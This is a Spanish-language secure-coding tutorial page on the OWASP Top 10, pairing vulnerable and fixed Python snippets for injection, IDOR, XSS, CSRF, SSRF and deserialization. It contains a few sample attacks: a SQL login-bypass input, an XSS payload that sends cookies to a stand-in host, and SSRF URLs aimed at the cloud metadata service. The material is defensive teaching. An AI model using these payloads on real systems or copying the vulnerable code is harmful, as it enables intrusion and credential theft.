# 🔐 Seguridad 01 — OWASP y Vulnerabilidades

[[Desarrollo Profesional/Seguridad Aplicada/Seguridad Aplicada|⬅️ Volver a Seguridad Aplicada]] | [[Desarrollo Profesional/Seguridad Aplicada/Páginas/02 - Autenticación y Autorización|02 →]]

> [!abstract] Introducción
> El OWASP Top 10 es la lista de las categorías de vulnerabilidad más críticas en aplicaciones web, mantenida por la Open Worldwide Application Security Project. No es exhaustiva, pero cubre la inmensa mayoría de los incidentes reales. Esta página recorre las clases de bug que un desarrollador debe reconocer y prevenir por reflejo: inyección, fallos de control de acceso, XSS, CSRF, SSRF y deserialización insegura. La idea no es memorizar la lista, sino interiorizar el patrón común: **nunca confíes en la entrada, nunca mezcles datos con código.**

## ¿De qué vamos a hablar?

Las vulnerabilidades más explotadas en aplicaciones reales, cómo funcionan y cómo se previenen en código.

### Conceptos que vamos a cubrir
- El principio raíz: confianza en la entrada y mezcla datos/código
- Inyección (SQL, comandos) y consultas parametrizadas
- Broken Access Control: IDOR y escalada de privilegios
- XSS y CSRF: ataques desde el navegador
- SSRF y deserialización insegura

---

## El Concepto

### El Principio Raíz

Casi todas las vulnerabilidades de esta página son variantes de un mismo error: **mezclar datos no confiables con código o comandos**. SQL injection mezcla input con una consulta; XSS mezcla input con HTML; command injection mezcla input con un comando de shell. La defensa es siempre la misma idea: **separar datos de código** (parametrización, escapado contextual, allow-lists) y **validar/normalizar la entrada** en el límite del sistema.

### A03 — Inyección (SQL, Comandos)

La inyección ocurre cuando datos del usuario se interpretan como código. El caso canónico es SQL:

```python
# ❌ VULNERABLE — el input se concatena en la consulta
def login(usuario, password):
    query = f"SELECT * FROM usuarios WHERE user = '{usuario}' AND pass = '{password}'"
    return db.execute(query)
# Si usuario = "admin' --", la consulta se convierte en:
#   SELECT * FROM usuarios WHERE user = 'admin' --' AND pass = '...'
# El "--" comenta el resto: entras como admin sin saber la contraseña.

# ✅ SEGURO — consulta parametrizada: el driver separa código de datos
def login(usuario, password):
    query = "SELECT * FROM usuarios WHERE user = %s AND pass = %s"
    return db.execute(query, (usuario, password))
# El input NUNCA se interpreta como SQL; va como valor, pase lo que pase.
```

La regla absoluta: **nunca construyas consultas con f-strings, concatenación o `.format()`**. Usa siempre parámetros (`%s`, `?`, `:nombre` según el driver) o un ORM que parametrice por debajo. Lo mismo aplica a comandos de shell (`subprocess.run([...], shell=False)` con lista de argumentos, nunca `shell=True` con string interpolado) y a NoSQL.

### A01 — Broken Access Control (IDOR)

La vulnerabilidad nº 1 del Top 10 actual. Ocurre cuando el sistema **autentica** (sabe quién eres) pero no **autoriza** correctamente (no comprueba si *tú* puedes acceder a *ese* recurso). El caso típico es el **IDOR** (Insecure Direct Object Reference):

```python
# ❌ VULNERABLE — devuelve la factura sin comprobar de quién es
@app.get("/facturas/{factura_id}")
def get_factura(factura_id: int, usuario=Depends(usuario_actual)):
    return db.facturas.get(factura_id)
# Estoy autenticado como usuario 7, pero pido /facturas/999 (de otro)
# y me la devuelve. El ID es "directo" y no se valida la propiedad.

# ✅ SEGURO — la autorización comprueba la pertenencia
@app.get("/facturas/{factura_id}")
def get_factura(factura_id: int, usuario=Depends(usuario_actual)):
    factura = db.facturas.get(factura_id)
    if factura is None or factura.propietario_id != usuario.id:
        raise HTTPException(404)   # 404, no 403: no revelar que existe
    return factura
```

Reglas: **comprueba la autorización en cada acceso a un recurso**, en el servidor (nunca confíes en que el cliente oculte el botón), y prefiere `404` sobre `403` para no filtrar la existencia de recursos. La escalada de privilegios (un usuario normal accede a funciones de admin) es la misma clase de bug a nivel de rol.

### A03 — Cross-Site Scripting (XSS)

XSS inyecta JavaScript malicioso en una página que verán otros usuarios. Si renderizas input sin escapar, un atacante puede robar cookies, hacer acciones en nombre de la víctima, etc.

```python
# ❌ VULNERABLE — el comentario se inserta crudo en el HTML
html = f"<div class='comentario'>{comentario_usuario}</div>"
# Si comentario = "<script>fetch('//malo/'+document.cookie)</script>",
# ese script se ejecuta en el navegador de quien vea el comentario.

# ✅ SEGURO — escapar según el contexto (lo hacen los motores de plantillas)
from markupsafe import escape
html = f"<div class='comentario'>{escape(comentario_usuario)}</div>"
# < > & " ' se convierten en entidades HTML: el navegador los muestra
# como texto, no los ejecuta.
```

Defensas: **escapado contextual automático** (Jinja2, React y la mayoría de frameworks lo hacen por defecto — no lo desactives), una **Content-Security-Policy** que restrinja de dónde se cargan scripts, y la flag `HttpOnly` en cookies de sesión para que JS no pueda leerlas.

### A01 — Cross-Site Request Forgery (CSRF)

CSRF engaña al navegador de la víctima para que envíe una petición autenticada que ella no quería. Como el navegador adjunta las cookies automáticamente, una web maliciosa puede provocar un `POST /transferir` usando *tu* sesión.

Defensas:
- **Tokens anti-CSRF**: un token aleatorio, ligado a la sesión, que debe acompañar cada petición que muta estado. La web atacante no puede leerlo (same-origin policy), así que no puede falsificar la petición.
- **Cookies `SameSite=Lax` o `Strict`**: el navegador no envía la cookie en peticiones cross-site. Es la defensa moderna por defecto y mitiga la mayoría de CSRF.
- Las APIs con tokens en cabecera `Authorization` (no cookies) son inmunes por construcción: el navegador no añade esa cabecera automáticamente.

### A10 — SSRF (Server-Side Request Forgery)

SSRF engaña a *tu servidor* para que haga peticiones a destinos que el atacante elige. Es especialmente peligroso en la nube: el servidor puede acceder a endpoints internos (el metadata service `169.254.169.254` de GCP/AWS, que expone credenciales).

```python
# ❌ VULNERABLE — el servidor pide la URL que diga el usuario
@app.post("/importar")
def importar(url: str):
    return httpx.get(url).text
# url = "http://169.254.169.254/computeMetadata/v1/..." → filtra credenciales
# url = "http://servicio-interno:8080/admin" → alcanza la red interna

# ✅ SEGURO — allow-list de destinos y bloqueo de IPs internas
import ipaddress, socket
from urllib.parse import urlparse

DOMINIOS_PERMITIDOS = {"cdn.miempresa.com", "imagenes.proveedor.com"}

def url_segura(url: str) -> bool:
    host = urlparse(url).hostname
    if host not in DOMINIOS_PERMITIDOS:
        return False
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    # Rechaza loopback, privadas, link-local (metadata service)
    return not (ip.is_private or ip.is_loopback or ip.is_link_local)
```

Defensa: **allow-list de dominios**, resolver la IP y bloquear rangos privados/link-local, y desactivar redirecciones automáticas (un destino permitido podría redirigir a uno interno).

### A08 — Deserialización Insegura

Deserializar datos no confiables con formatos que pueden instanciar objetos arbitrarios es ejecución de código remoto disfrazada. En Python, el culpable clásico es `pickle`:

```python
# ❌ PELIGRO — pickle puede ejecutar código arbitrario al deserializar
import pickle
datos = pickle.loads(payload_del_usuario)   # RCE si el payload es malicioso

# ✅ SEGURO — formatos de datos sin capacidad de ejecución
import json
datos = json.loads(payload_del_usuario)   # JSON solo produce datos, no código
```

Nunca deserialices con `pickle`, `yaml.load` (usa `yaml.safe_load`) o equivalentes datos que vengan de fuera. Usa JSON u otros formatos que solo representen datos.

---

## 🔑 Resumen

> [!summary] Puntos Clave
> - **Principio raíz**: casi toda vulnerabilidad es mezclar datos no confiables con código/comandos. Separa datos de código y valida la entrada en el límite.
> - **Inyección**: nunca construyas consultas/comandos por concatenación. Usa siempre parámetros (`%s`, `?`) y `subprocess` con lista de argumentos, no `shell=True`.
> - **Broken Access Control (IDOR)**: autenticar no es autorizar. Comprueba la propiedad del recurso en cada acceso, en el servidor; usa `404` para no filtrar existencia.
> - **XSS**: escapa el output según el contexto (los frameworks lo hacen por defecto), usa CSP y cookies `HttpOnly`.
> - **CSRF**: tokens anti-CSRF + cookies `SameSite`. Las APIs con token en cabecera `Authorization` son inmunes.
> - **SSRF**: allow-list de destinos y bloqueo de IPs internas (cuidado con el metadata service de la nube).
> - **Deserialización**: nunca `pickle`/`yaml.load` sobre datos externos; usa JSON.

### Para llevar a la práctica
- [ ] Busca en tu código consultas SQL construidas con f-string/`.format()`. Conviértelas a parametrizadas.
- [ ] Revisa tus endpoints `GET /recurso/{id}`: ¿comprueban que el recurso pertenece al usuario autenticado?
- [ ] Comprueba que tus cookies de sesión tienen `HttpOnly`, `Secure` y `SameSite`.
- [ ] Si tu servicio hace peticiones HTTP a URLs que da el usuario, añade allow-list y bloqueo de IPs privadas.

### Recursos
- 🌐 owasp.org/Top10 — el OWASP Top 10 con descripción de cada categoría
- 🌐 owasp.org/www-project-cheat-sheets — cheat sheets prácticas por tema (la mejor referencia)
- 🌐 portswigger.net/web-security — Web Security Academy (laboratorios gratuitos)
- 📖 *The Web Application Hacker's Handbook* — Stuttard & Pinto

---
`#seguridad` `#owasp` `#inyeccion` `#xss` `#csrf`
